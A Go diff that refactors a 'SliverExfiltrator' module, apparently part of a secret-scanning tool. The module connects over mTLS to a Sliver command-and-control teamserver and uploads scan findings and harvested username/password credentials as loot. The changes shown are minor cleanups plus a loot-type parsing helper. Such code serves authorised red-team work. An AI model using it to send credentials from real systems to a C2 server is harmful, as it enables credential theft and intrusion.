@@ -22,7 +22,6 @@ type SliverExfiltrator struct {
 	rpc        rpcpb.SliverRPCClient
 	conn       *grpc.ClientConn
 	config     *assets.ClientConfig
-	sessionID  string
 	lootName   string
 	lootType   string
 	parseCreds bool
@@ -31,11 +30,11 @@ type SliverExfiltrator struct {
 // NewSliverExfiltrator creates a new Sliver exfiltrator.
 func NewSliverExfiltrator(cfg exfil.Config) (*SliverExfiltrator, error) {
 	if cfg.Sliver == nil {
-		return nil, fmt.Errorf("Sliver configuration is required")
+		return nil, fmt.Errorf("sliver configuration is required")
 	}
 
 	if cfg.Sliver.ConfigPath == "" {
-		return nil, fmt.Errorf("Sliver config path is required")
+		return nil, fmt.Errorf("sliver config path is required")
 	}
 
 	configPath := expandPath(cfg.Sliver.ConfigPath)
@@ -48,11 +47,6 @@ func NewSliverExfiltrator(cfg exfil.Config) (*SliverExfiltrator, error) {
 	rpcClient, conn, err := transport.MTLSConnect(clientConfig)
 	if err != nil {
 		return nil, fmt.Errorf("failed to connect to Sliver teamserver: %w", err)
-	}
-
-	sessionID := ""
-	if cfg.Sliver.SessionID != nil && *cfg.Sliver.SessionID != "" {
-		sessionID = *cfg.Sliver.SessionID
 	}
 
 	lootName := "pillager-scan"
@@ -74,7 +68,6 @@ func NewSliverExfiltrator(cfg exfil.Config) (*SliverExfiltrator, error) {
 		rpc:        rpcClient,
 		conn:       conn,
 		config:     clientConfig,
-		sessionID:  sessionID,
 		lootName:   lootName,
 		lootType:   lootType,
 		parseCreds: parseCreds,
@@ -118,9 +111,12 @@ func (s *SliverExfiltrator) storeLoot(ctx context.Context, findings []pillager.F
 		Data: data,
 	}
 
+	// Parse loot type from configuration
+	lootType := s.parseLootType()
+
 	lootReq := &clientpb.Loot{
 		Name:     lootName,
-		Type:     clientpb.LootType_LOOT_FILE,
+		Type:     lootType,
 		FileType: clientpb.FileType_TEXT,
 		File:     file,
 	}
@@ -151,8 +147,10 @@ func (s *SliverExfiltrator) storeCredentials(ctx context.Context, credentials []
 			continue
 		}
 
+		credName := fmt.Sprintf("%s-%s", cred.Collection, cred.Username)
+
 		lootReq := &clientpb.Loot{
-			Name:           fmt.Sprintf("%s-%s", cred.Collection, cred.Username),
+			Name:           credName,
 			Type:           clientpb.LootType_LOOT_CREDENTIAL,
 			CredentialType: clientpb.CredentialType_USER_PASSWORD,
 			Credential:     credReq,
@@ -172,6 +170,18 @@ func (s *SliverExfiltrator) Close() error {
 		return s.conn.Close()
 	}
 	return nil
+}
+
+func (s *SliverExfiltrator) parseLootType() clientpb.LootType {
+	switch s.lootType {
+	case "file":
+		return clientpb.LootType_LOOT_FILE
+	case "credential", "credentials":
+		return clientpb.LootType_LOOT_CREDENTIAL
+	default:
+		// Default to file type for findings data
+		return clientpb.LootType_LOOT_FILE
+	}
 }
 
 func expandPath(path string) string {
